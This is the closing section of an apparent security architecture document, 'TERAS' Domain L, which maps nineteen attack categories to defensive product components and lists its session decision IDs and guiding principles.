â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    TERAS Attack Research Integration                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                     â”‚
â”‚  ATTACK RESEARCH â†’ TERAS DEFENSE MAPPING:                           â”‚
â”‚                                                                     â”‚
â”‚  Web Attacks (L-02)        â†’ GAPURA comprehensive protection       â”‚
â”‚  Memory Corruption (L-03)  â†’ TERAS-LANG memory safety              â”‚
â”‚  Crypto Attacks (L-04)     â†’ Verified crypto, PQC readiness        â”‚
â”‚  Network Attacks (L-05)    â†’ GAPURA protocol validation            â”‚
â”‚  Malware (L-06)            â†’ ZIRAH behavioral detection            â”‚
â”‚  Supply Chain (L-07)       â†’ Zero dependencies, verified builds    â”‚
â”‚  Cloud Attacks (L-08)      â†’ Cloud-agnostic, container hardening   â”‚
â”‚  Mobile Attacks (L-09)     â†’ MENARA multi-layer protection         â”‚
â”‚  Identity Attacks (L-10)   â†’ BENTENG phishing-resistant auth       â”‚
â”‚  Insider Threats (L-11)    â†’ Cross-product correlation             â”‚
â”‚  Physical Attacks (L-12)   â†’ Hardware security integration         â”‚
â”‚  AI/ML Attacks (L-13)      â†’ Robust detection, explainability      â”‚
â”‚  Zero-Days (L-14)          â†’ Defense in depth, memory safety       â”‚
â”‚  API Attacks (L-15)        â†’ GAPURA API security                   â”‚
â”‚  Firmware Attacks (L-16)   â†’ Verified boot, integrity monitoring   â”‚
â”‚  Wireless Attacks (L-17)   â†’ MENARA wireless security              â”‚
â”‚  Social Engineering (L-18) â†’ Human-focused controls                â”‚
â”‚  DoS Attacks (L-19)        â†’ GAPURA DDoS protection                â”‚
â”‚                                                                     â”‚
â”‚  KEY PRINCIPLES:                                                    â”‚
â”‚  1. Assume sophisticated adversary                                 â”‚
â”‚  2. Defense in depth at every layer                               â”‚
â”‚  3. Formal verification where possible                            â”‚
â”‚  4. Memory safety eliminates attack classes                       â”‚
â”‚  5. Continuous threat intelligence integration                    â”‚
â”‚                                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Decision ID: TERAS-ARCH-L20-INTEGRATE-001
```

---

# Domain L Summary: Attack Research

| Session | Topic | Decision ID |
|---------|-------|-------------|
| L-01 | Attack Taxonomy | TERAS-ARCH-L01-TAXONOMY-001 |
| L-02 | Web Application | TERAS-ARCH-L02-WEBAPP-001 |
| L-03 | Memory Corruption | TERAS-ARCH-L03-MEMORY-001 |
| L-04 | Cryptographic | TERAS-ARCH-L04-CRYPTO-001 |
| L-05 | Network | TERAS-ARCH-L05-NETWORK-001 |
| L-06 | Malware | TERAS-ARCH-L06-MALWARE-001 |
| L-07 | Supply Chain | TERAS-ARCH-L07-SUPPLY-CHAIN-001 |
| L-08 | Cloud | TERAS-ARCH-L08-CLOUD-001 |
| L-09 | Mobile | TERAS-ARCH-L09-MOBILE-001 |
| L-10 | Identity | TERAS-ARCH-L10-IDENTITY-001 |
| L-11 | Insider | TERAS-ARCH-L11-INSIDER-001 |
| L-12 | Physical | TERAS-ARCH-L12-PHYSICAL-001 |
| L-13 | AI/ML | TERAS-ARCH-L13-AIML-001 |
| L-14 | Zero-Day | TERAS-ARCH-L14-ZERODAY-001 |
| L-15 | API | TERAS-ARCH-L15-API-001 |
| L-16 | Firmware | TERAS-ARCH-L16-FIRMWARE-001 |
| L-17 | Wireless | TERAS-ARCH-L17-WIRELESS-001 |
| L-18 | Social Engineering | TERAS-ARCH-L18-SOCIAL-001 |
| L-19 | DoS | TERAS-ARCH-L19-DOS-001 |
| L-20 | Integration | TERAS-ARCH-L20-INTEGRATE-001 |

## Key Principles

1. **Know the adversary**: Deep attack research informs defense
2. **Eliminate attack classes**: Memory safety removes entire categories
3. **Defense in depth**: No single control is sufficient
4. **Formal verification**: Prove security where possible
5. **Continuous learning**: Threat landscape evolves constantly

## DOMAIN L: COMPLETE

---

*Research Track Output â€” Domain L: Attack Research*
*Mode: ULTRA KIASU | EXHAUSTIVE | COMPLETE*

---

**SHA-256**: To be computed
